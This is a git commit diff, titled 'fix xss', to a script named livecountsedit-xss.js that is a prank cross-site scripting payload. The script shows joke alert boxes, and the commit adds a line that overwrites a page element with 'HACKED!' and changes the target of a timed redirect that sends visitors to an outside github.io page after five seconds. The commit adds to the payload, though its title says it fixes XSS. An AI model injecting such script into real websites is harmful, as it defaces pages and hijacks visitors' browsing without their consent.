c301e653c19e9f93a0c35a7bb9b6d14ecc7f3fb4
asdfugil <42699250+asdfugil@users.noreply.github.com>
2020-12-27 17:39:31 +0800

    fix xss

--- public/scripts/livecountsedit-xss.js
+++ public/scripts/livecountsedit-xss.js
@@ -1,8 +1,9 @@
+document.getElementByID("name").innerHTML = "HACKED! :))))"
 alert("This is an XSS Payload")
 alert("lmao")
 alert('You will be redirected to anime earrape in 5 seconds')
 console.log('hi')
-//$('counterTitle').innerHTML = 'HI LOL'
+
 setTimeout(() => {
-    window.location.replace('https://assfugil.github.io')
+    window.location.replace('https://asdfugil.github.io/platelet.html')
 },5000)
